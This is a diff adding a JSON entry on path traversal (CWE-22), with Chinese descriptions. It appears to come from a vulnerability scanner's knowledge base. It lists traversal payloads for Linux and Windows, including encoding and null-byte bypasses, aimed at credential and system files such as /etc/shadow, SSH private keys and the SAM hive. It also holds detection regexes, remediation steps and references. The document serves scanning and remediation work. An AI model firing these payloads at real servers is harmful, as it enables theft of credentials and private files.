@@ -1,0 +1,101 @@
+{
+    "path_traversal": {
+        "name": "路径遍历",
+        "cwe_id": "CWE-22",
+        "cvss_base_score": 7.5,
+        "description": "路径遍历漏洞允许攻击者访问预期目录之外的文件",
+        "impact": "敏感文件读取、源码泄露、配置文件泄露、任意文件写入",
+        "payloads": {
+            "linux": [
+                "../",
+                "../../",
+                "../../../",
+                "../../../../",
+                "../../../../../",
+                "../../../../../../etc/passwd",
+                "../../../../../../etc/shadow",
+                "../../../../../../etc/hosts",
+                "../../../../../../var/log/auth.log",
+                "../../../../../../proc/self/environ",
+                "../../../../../../proc/self/cmdline",
+                "../../../../../../home/{user}/.ssh/id_rsa",
+                "../../../../../../root/.bash_history",
+                "../../../../../../var/www/html/config.php",
+                "..%2f",
+                "..%2f..%2f",
+                "..%2f..%2f..%2f",
+                "%2e%2e/",
+                "%2e%2e%2f",
+                "..%252f",
+                "..%c0%af",
+                "..%c1%9c"
+            ],
+            "windows": [
+                "..\\",
+                "..\\..\\",
+                "..\\..\\..\\",
+                "..\\..\\..\\..\\",
+                "..\\..\\..\\..\\..\\windows\\win.ini",
+                "..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
+                "..\\..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
+                "..%5c",
+                "..%5c..%5c",
+                "%2e%2e\\",
+                "..%255c",
+                "..%c0%af",
+                "..%c1%9c"
+            ],
+            "bypass": [
+                "....//",
+                "....//....//",
+                "..././",
+                "..././..././",
+                "..../",
+                "..../..../",
+                "/var/www/html/../../../etc/passwd",
+                "/etc/passwd%00",
+                "/etc/passwd%00.jpg",
+                "/etc/passwd/././././",
+                "..;/",
+                "..%00/",
+                "..%0d/",
+                "..%0a/",
+                "..%09/"
+            ]
+        },
+        "detection_patterns": [
+            "open\\s*\\(.*\\+.*\\)",
+            "open\\s*\\(.*request\\..*\\)",
+            "open\\s*\\(.*%.*\\)",
+            "send_file\\s*\\(.*\\+.*\\)",
+            "send_file\\s*\\(.*request\\..*\\)",
+            "FileResponse\\s*\\(.*\\+.*\\)",
+            "os\\.path\\.join\\s*\\(.*request\\..*\\)",
+            "read\\s*\\(.*\\+.*\\)",
+            "file_get_contents\\s*\\(.*\\$_.*\\)",
+            "include\\s*\\(.*\\$_.*\\)",
+            "require\\s*\\(.*\\$_.*\\)"
+        ],
+        "safe_patterns": [
+            "os\\.path\\.basename\\s*\\(.*\\)",
+            "os\\.path\\.realpath\\s*\\(.*\\)",
+            "startswith\\s*\\(.*\\)",
+            "if.*not.*startswith",
+            "safe_join\\s*\\(.*\\)"
+        ],
+        "remediation": [
+            "使用os.path.basename()仅获取文件名",
+            "使用os.path.realpath()获取真实路径并验证",
+            "验证最终路径是否在预期目录内",
+            "使用白名单限制可访问的文件",
+            "避免用户输入直接用于文件路径",
+            "使用安全的文件访问API如Flask的safe_join",
+            "设置适当的文件系统权限"
+        ],
+        "references": [
+            "https://owasp.org/www-community/attacks/Path_Traversal",
+            "https://cwe.mitre.org/data/definitions/22.html",
+            "https://portswigger.net/web-security/file-path-traversal"
+        ]
+    }
+}
